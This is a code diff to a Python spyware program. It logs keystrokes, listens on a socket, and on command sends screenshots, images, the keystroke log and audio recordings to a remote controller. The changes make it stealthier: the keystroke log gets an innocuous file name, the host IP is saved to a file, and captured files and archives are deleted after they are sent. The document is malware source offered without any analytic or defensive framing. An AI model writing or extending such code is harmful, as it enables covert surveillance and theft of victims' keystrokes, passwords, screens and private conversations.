@@ -10,7 +10,7 @@ def on_press(key):
         logging.info(str(key))
 def fun3():
     log_dir = ""
-    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(message)s')
+    logging.basicConfig(filename=(log_dir + "log"), level=logging.DEBUG, format='%(message)s')
     with Listener(on_press=on_press) as listener:
         listener.join()
 def fun2():
@@ -24,6 +24,9 @@ def fun2():
                         port = 1244
                         soc.bind((host_name, port))
                         print(host_name, '({})'.format(ip))
+                        f = open("ipfile", "w")
+                        f.write(ip)
+                        f.close()
                         soc.listen(1) 
                         conn, addr = soc.accept()
                         while 1:
@@ -49,17 +52,23 @@ def fun2():
                                                         myzip.write('a.jpg')
                                                 with open ('send.zip','rb') as f1:
                                                         conn.send(f1.read(9000000))
+                                                os.remove('send.zip')
+                                                os.remove('a.jpg')
+                                                os.remove('a-final.jpg')
                                 if (data == 'screenshot'):
                                         im2 = pyautogui.screenshot('ss.png')
                                         with ZipFile('send.zip', 'w') as myzip:
                                                 myzip.write('ss.png')
                                         with open ('send.zip','rb') as f1:
                                                 conn.send(f1.read(9000000))
+                                        os.remove('send.zip')
+                                        os.remove('ss.png')
                                 if (data == 'keylog'):
                                         with ZipFile('send.zip', 'w') as myzip:
-                                                myzip.write('key_log.txt')
+                                                myzip.write('log')
                                         with open ('send.zip','rb') as f1:
                                                 conn.send(f1.read(9000000))
+                                        os.remove('send.zip')
                                 if (data == 'audio'):
                                         fs = 44100
                                         raw_data = conn.recv(1024)
@@ -75,6 +84,8 @@ def fun2():
                                                 myzip.write('file.mp3')
                                         with open ('send.zip','rb') as f1:
                                                 conn.send(f1.read(9000000))
+                                        os.remove('send.zip')
+                                        os.remove('file.mp3')
                         conn.close()
                 except:
                         pass
